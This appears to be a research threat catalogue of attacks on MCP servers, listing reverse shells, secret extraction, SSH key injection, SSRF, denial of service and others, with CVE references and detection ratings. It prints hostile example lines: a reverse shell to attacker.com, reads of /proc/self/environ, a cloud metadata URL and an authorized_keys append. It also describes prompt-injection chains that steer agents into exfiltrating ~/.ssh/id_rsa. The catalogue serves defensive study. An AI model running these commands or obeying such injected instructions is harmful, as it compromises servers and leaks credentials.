# Reduced MCP Server Attacks v3 — Styled Version

> This reduced file keeps only the attacks you selected and presents each one in the same **Field / Detail** style as the original detailed attack entries.
>
> **Threat model:** the MCP **server is the protected asset**. A malicious user, acting through an AI agent or directly, abuses server tools in ways that damage the server, its data, or its connected resources.

---

## Part 1 — Core Selected Attacks

### 1. Reverse Shell

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Attacker injects a payload that causes the server to open an outbound interactive shell to an attacker-controlled endpoint. |
| **Example** | A server execution tool receives input like `bash -i >& /dev/tcp/attacker.com/4444 0>&1`, giving the attacker interactive access to the server host. |
| **Server damage** | Full host compromise; attacker can run commands, pivot, persist, and tamper with the system. |
| **Source** | Reduced from original attack **1.2 Reverse Shell** in `mcp_server_attacks_v3.md`. |
| **Real CVEs** | No dedicated MCP-server CVE was the main anchor here in the original file; this remains a strong server-compromise pattern. |
| **Detection** | **High** |

### 2. Environment Variable Exposure / Token Extraction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker causes the server to reveal environment variables, tokens, API keys, or other process-level secrets. |
| **Example** | The server is tricked into running `printenv` or reading `/proc/self/environ`, exposing values such as `OPENAI_API_KEY`, `JWT_SECRET`, or cloud credentials. |
| **Server damage** | Confidentiality loss; stolen credentials may enable lateral movement beyond the MCP layer. |
| **Source** | Reduced merge of original attacks **3.1 API Key / Token Extraction** and **3.2 Environment Variable Exposure**. |
| **Real CVEs** | Supported in the original file by DVMCP token-theft style evidence and general secret-exposure patterns, but not tied to one single MCP CVE. |
| **Detection** | **Medium** |

### 3. SSH Key Injection

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker uses a file-write capability to add their public key into the server's SSH trust store. |
| **Example** | A writable file tool is abused to append an attacker-controlled public key into `~/.ssh/authorized_keys`, enabling persistent login to the server. |
| **Server damage** | Persistent remote host access independent of the MCP session. |
| **Source** | Original attack **2.3 SSH Key Injection**. |
| **Real CVEs** | The original file linked this pattern to **CVE-2026-27825** as a demonstrated arbitrary-write consequence. |
| **Detection** | **High** |

### 4. Log Tampering / Evidence Destruction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker deletes, truncates, or rewrites logs so earlier malicious actions become harder to detect or investigate. |
| **Example** | After stealing data, the attacker uses a file-write or delete capability to remove `/var/log/mcp_server.log` or replace it with benign-looking entries. |
| **Server damage** | Forensic blindness; weaker incident response; compliance and audit risk. |
| **Source** | Original attack **2.4 Log Tampering / Evidence Destruction**. |
| **Real CVEs** | No dedicated MCP-specific CVE was listed in the original file; treated as a valid consequence of file-write or delete abuse. |
| **Detection** | **Medium** |

### 5. Database Credential Exposure

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker reads database credentials, connection strings, or service configuration that allow direct backend access. |
| **Example** | A file-read tool reveals `postgres://admin:secret@db:5432/prod` inside a config file or environment-backed settings file. |
| **Server damage** | Direct backend compromise risk; bypasses MCP-layer controls entirely. |
| **Source** | Original attack **3.3 Database Credential Extraction**. |
| **Real CVEs** | Not a separate MCP CVE class in the original file; treated as a direct consequence of secret exposure and path traversal style access. |
| **Detection** | **Medium** |

### 6. Privilege Escalation via Tool Chaining

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Several individually acceptable tools are combined into a sequence that achieves a privileged effect the server should never allow as a whole. |
| **Example** | The attacker first reads a privileged config, then writes a modified policy file, then triggers an execution tool under the new permissions. |
| **Server damage** | High-privilege action reached through multi-step abuse; can end in full compromise. |
| **Source** | Original attack **5.3 Privilege Escalation via Tool Chaining**. |
| **Real CVEs** | The original file framed this mainly as an MCP-shaped multi-tool attack pattern rather than a single-CVE class. |
| **Detection** | **Very High** |

### 7. Resource Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker consumes CPU, memory, storage, or other finite server resources until service degrades or fails. |
| **Example** | The attacker repeatedly requests huge file generation, expensive parsing, or infinite processing workloads that saturate server resources. |
| **Server damage** | Availability degradation or full denial of service. |
| **Source** | Reduced merge of original attacks **6.1 Resource Exhaustion (CPU / Memory)** and **6.2 Disk Exhaustion**. |
| **Real CVEs** | The original file treated this as a valid attack pattern rather than a CVE-backed MCP-specific class. |
| **Detection** | **Low** |

### 8. Recursive and Circular Task Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent falls into repeated or circular tool invocation patterns that keep the server busy indefinitely. |
| **Example** | A retrieval or summary tool output sends the agent into another call, whose output loops back again, creating an endless cycle. |
| **Server damage** | Availability loss; runaway consumption even without a classical low-level exploit payload. |
| **Source** | Original attack **6.4 Recursive and Circular Task Exhaustion**. |
| **Real CVEs** | No direct MCP CVE anchor in the original file; treated as an agent-mediated availability pattern. |
| **Detection** | **Medium** |

### 9. SSRF (Server-Side Request Forgery)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker tricks the server into making requests to internal or cloud-only endpoints that the attacker cannot access directly. |
| **Example** | A fetch-style tool is given `http://169.254.169.254/latest/meta-data/` or another internal address, causing the server to access protected internal resources. |
| **Server damage** | Internal network exposure; cloud metadata theft; credential leakage; internal pivoting. |
| **Source** | Original attack **8.1 SSRF**. |
| **Real CVEs** | The original file listed **CVE-2025-5276**, **CVE-2026-27826**, and **CVE-2026-26118** as real SSRF examples. |
| **Detection** | **High** |

### 10. Replay Attacks

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | A valid request, token, or action is captured and replayed so the server repeats an operation it should have treated as one-time or expired. |
| **Example** | A previously valid authenticated tool call is replayed to repeat a financial, administrative, or destructive operation. |
| **Server damage** | Duplicate operations; stale authorization accepted as fresh. |
| **Source** | Original attack **10.1 Replay Attack**. |
| **Real CVEs** | No direct MCP CVE was the main basis in the original file; included as a protocol and session-integrity weakness. |
| **Detection** | **High** |

### 11. Session Abuse / Temporal Accumulation

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Individually mild requests accumulate over time into a harmful overall pattern that the server fails to recognize. |
| **Example** | Over many turns, the attacker first enumerates files, then reads secrets, then stages and exfiltrates the results. |
| **Server damage** | Slow-burn compromise that evades single-request defenses. |
| **Source** | Original attack **10.2 Session Abuse / Temporal Risk Accumulation**. |
| **Real CVEs** | Not anchored to one main CVE in the original file; treated as a sequential abuse pattern. |
| **Detection** | **Very High** |

### 12. False Error Escalation

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker deliberately triggers errors so the server falls back to a more privileged or less protected recovery path. |
| **Example** | A malformed request forces the server into a diagnostic or fallback flow that has broader permissions than the primary tool path. |
| **Server damage** | Privilege abuse through exception-handling logic rather than the normal business path. |
| **Source** | Original attack **11.2 False Error Escalation**. |
| **Real CVEs** | No dedicated MCP CVE anchor in the original file; included as a valid server-side design failure pattern. |
| **Detection** | **Very High** |

### 13. RADE (Retrieval-Augmented Data Exfiltration)

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | External content retrieved by the agent influences later server-tool use, leading to collection and exfiltration of server-side data. |
| **Example** | A poisoned retrieved document instructs the agent to inspect `~/.ssh/id_rsa` and send it out using another server tool, and the agent follows that chain. |
| **Server damage** | Server data leakage through a multi-step tool sequence triggered by retrieved content. |
| **Source** | Original attack **12.1 RADE — Server Tools Weaponized via Poisoned Retrieval**. |
| **Real CVEs** | The original file treated this as a strong MCP-shaped pattern rather than a CVE-backed bug class. |
| **Detection** | **Very High** |

### 14. Tool Misuse / Confused Deputy

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | A valid server tool is used for a malicious purpose even though the tool itself behaves correctly. |
| **Example** | An email or publishing tool intended for benign notifications is used to send phishing content or leak sensitive information. |
| **Server damage** | Reputational, operational, and downstream harm caused through legitimate server capabilities. |
| **Source** | Original attack **13.2 Confused Deputy / Tool Misuse**. |
| **Real CVEs** | Not represented as one direct MCP CVE in the original file; modeled as an authorization and policy-abuse pattern. |
| **Detection** | **Very High** |

### 15. Denial of Wallet

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker causes excessive spending on metered services such as LLM APIs, cloud APIs, or external SaaS integrations. |
| **Example** | Thousands of costly analysis requests are sent through a server wrapper around a paid model or other paid API. |
| **Server damage** | Financial harm; quota exhaustion; possible account suspension by upstream providers. |
| **Source** | Original attack **15.1 Denial of Wallet (API Cost Exhaustion)**. |
| **Real CVEs** | Treated in the original file as an ecosystem and policy problem rather than a CVE-based implementation flaw. |
| **Detection** | **Very High** |

### 16. Scraping / Systematic Data Extraction

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker repeatedly uses legitimate read capabilities to replicate a large protected dataset from the server. |
| **Example** | A competitor's agent systematically queries every product, user segment, or document range until it reconstructs the full dataset. |
| **Server damage** | Large-scale confidentiality and business-value loss without one obviously malicious request. |
| **Source** | Original attack **16.1 Systematic Data Extraction (Scraping)**. |
| **Real CVEs** | No single MCP CVE was the main support in the original file; positioned as a patterned abuse threat. |
| **Detection** | **Very High** |

### 17. Multi-Tenant Data Leakage

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | One tenant or client receives another tenant's data because isolation between sessions, caches, or transports is broken. |
| **Example** | Shared transport or cache state causes responses intended for Tenant A to appear in Tenant B's session. |
| **Server damage** | Cross-tenant breach; severe trust, legal, and compliance consequences. |
| **Source** | Original attack **16.2 Multi-Tenant Data Leakage**. |
| **Real CVEs** | The original file used **CVE-2026-25536** as a real example of cross-client data leakage via shared transport reuse. |
| **Detection** | **Very High** |

### 18. Throttle Bypass

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The attacker defeats or avoids rate and usage controls that should limit the frequency or volume of tool calls. |
| **Example** | Requests are spread across sessions, identities, or parameters so the server's counters never trigger correctly. |
| **Server damage** | Abuse at scale; often amplifies scraping, exhaustion, and billing attacks. |
| **Source** | Original attack **17.1 Rate Limit / Throttle Bypass**. |
| **Real CVEs** | No direct MCP CVE was central in the original file; treated as a guardrail and control weakness. |
| **Detection** | **High** |

### 19. Toxic Content Generation via Tool Proxy

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent uses the server's capabilities to generate, store, or transmit harmful or policy-violating content. |
| **Example** | A content-generation or outbound-message tool is used to create abusive, fraudulent, or unsafe content through the server operator's account or infrastructure. |
| **Server damage** | Legal, policy, and reputational harm to the operator. |
| **Source** | Original attack **17.2 Toxic Content Generation via Server Tools**. |
| **Real CVEs** | Not a CVE-style implementation flaw in the original file; included as harmful yet technically valid misuse. |
| **Detection** | **High** |

### 20. Indirect Prompt Injection → Server Tool Abuse

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | Hidden instructions embedded in external content are consumed by the agent and cause it to abuse the server's own tools. |
| **Example** | A retrieved webpage, issue, or document contains hidden instructions that steer the agent into reading secrets or calling dangerous tools. |
| **Server damage** | Server-side abuse arrives as apparently valid tool use but is externally steered. |
| **Source** | Original attack **18.2 Indirect Prompt Injection → Server Tool Abuse**. |
| **Real CVEs** | The original file treated this as a major MCP-shaped vector and cited benchmark and incident-style evidence rather than one implementation CVE. |
| **Detection** | **None** |

### 21. Alignment Failure / Goal Misalignment

| Field | Detail |
|-------|--------|
| **Tier** | Core |
| **Description** | The agent pursues a locally reasonable objective in a way that violates the server operator's true intent, safety policy, or risk tolerance. |
| **Example** | The agent interprets “solve the task efficiently” as permission to use broad tools, query excessive data, or skip safeguards. |
| **Server damage** | Cross-cutting misuse that may lead to exfiltration, policy abuse, or overreach without a classical exploit. |
| **Source** | Reduced discussion item based on the original alignment and autonomy-abuse style concerns surrounding server protection. |
| **Real CVEs** | Not a CVE-backed vulnerability class; included as a practical risk category for runtime defense framing. |
| **Detection** | **Low** |

---

## Part 2 — Maybe Attacks

### M1. SQL Injection

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | User-controlled input is interpreted as SQL, enabling unauthorized reads, writes, or destructive database actions. |
| **Example** | An attacker submits crafted SQL fragments through a search or query tool and alters the meaning of the backend database query. |
| **Server damage** | Database corruption, data theft, or record deletion. |
| **Source** | Original attack **4.1 SQL Injection via Tool Parameters**. |
| **Reason not in core set** | Strong classical vulnerability, but the reduced list currently emphasizes more MCP-shaped misuse and control patterns. |
| **Detection** | **Medium** |

### M2. State Corruption

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | The attacker changes internal state, cached values, or configuration in ways that leave the server inconsistent or unsafe. |
| **Example** | Repeated tool calls modify config records or cache entries until the server behaves unpredictably. |
| **Server damage** | Integrity loss; unstable or unsafe behavior. |
| **Source** | Original attack **4.3 State Corruption**. |
| **Reason not in core set** | Valid but broad, and it overlaps with privilege abuse, misuse, and integrity-compromise patterns. |
| **Detection** | **High** |

### M3. Protocol-Level Exhaustion

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | Malformed or high-volume protocol interactions exhaust parser, transport, or connection-handling resources. |
| **Example** | Oversized JSON-RPC payloads or abusive transport patterns overwhelm the server's protocol layer. |
| **Server damage** | Availability degradation or crashes at the protocol boundary. |
| **Source** | Closest original attack: **8.3 Protocol-Level Exploitation** and adjacent transport abuse entries. |
| **Reason not in core set** | Important, but overlaps with broader resource exhaustion in the reduced version. |
| **Detection** | **Medium** |

### M4. Cross-Server Exploitation

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | Access to one MCP server helps the agent attack another server through shared context or weak cross-server trust boundaries. |
| **Example** | The agent authenticates to one server, discovers another server's tools, and abuses the second server without independent authorization. |
| **Server damage** | Trust-boundary violation across multiple servers. |
| **Source** | Original attack **13.1 Cross-Server Exploitation**. |
| **Reason not in core set** | Strong and MCP-specific, but best included when the paper explicitly models multi-server trust propagation. |
| **Detection** | **Very High** |

### M5. Data Exfiltration via Tool Output Channels

| Field | Detail |
|-------|--------|
| **Tier** | Maybe |
| **Description** | The agent relays sensitive data through legitimate outbound channels such as email, issue trackers, chat replies, or APIs. |
| **Example** | Secrets read through one tool are posted into a GitHub issue or sent through a server-controlled communication tool. |
| **Server damage** | Confidential data leaves the server through apparently valid outbound actions. |
| **Source** | Original attack **16.5 Data Exfiltration via Tool Output Channels**. |
| **Reason not in core set** | Strong pattern, but it overlaps with RADE and confused-deputy style misuse in the reduced set. |
| **Detection** | **Very High** |

---

## Part 3 — Topic to Discuss: Sandbox / Execution Isolation

### Sandbox as a Cross-Cutting Defense Surface

| Field | Detail |
|-------|--------|
| **Type** | Discussion topic |
| **Description** | Sandboxing is better treated as a defense layer than as a standalone attack. It limits blast radius when compromise or misuse succeeds. |
| **Why it matters** | It reduces damage from reverse shell, SSH key injection, SSRF, tool chaining, and runaway execution paths. |
| **Where it connects** | Compromise attacks, exposure attacks, exhaustion attacks, and misuse attacks all become less severe when execution is isolated. |
| **Paper recommendation** | Present sandboxing as a **cross-cutting mitigation layer** rather than a primary attack class. |

